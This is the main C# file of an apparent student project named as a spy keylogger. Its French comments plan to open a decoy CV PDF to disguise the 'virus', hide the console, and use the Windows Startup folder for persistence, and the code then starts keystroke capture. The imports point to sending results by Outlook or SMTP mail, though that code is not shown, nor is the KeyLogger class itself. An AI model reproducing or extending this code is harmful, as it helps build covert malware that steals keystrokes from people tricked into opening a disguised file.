using System;
using System.Windows.Forms;
using System.Diagnostics;
using Outlook = Microsoft.Office.Interop.Outlook;
using System.Net.Mail;
using System.IO;
using Microsoft.WindowsAPICodePack.Shell;

namespace ProjetEspionKeyLogger
{
    class Program
    {

        static void Main(string[] args)
        {

            


            //Ligne a supprimer la console ne devra surtout pas s'afficher une fois le progamme créé
            Console.WriteLine("Hello World!");
            /*
            //Génere un document PDF pour dissimuler le virus
            var pdf = new Process();
            //Passe en parametre le chemin du document
            pdf.StartInfo = new ProcessStartInfo(@"C:/Users/Charlie/OneDrive/Etudes/M2 OPSIE/CV/CV_Camenen.pdf")
            {UseShellExecute = true};
            //Ouverture du pdf
            pdf.Start();*/

          
            //Dossier des programme a demarer automatiquement
            //C:/Users/Charlie/AppData/Roaming/Microsoft/Windows/start Menu/Programs/Startup


            //création de l'objet KeyLogger
            KeyLogger key_logger = new KeyLogger();
            key_logger.capture();
            //key_logger.CreateTestMessage2();
            Console.WriteLine("FIN!");
        }

       
    }
}
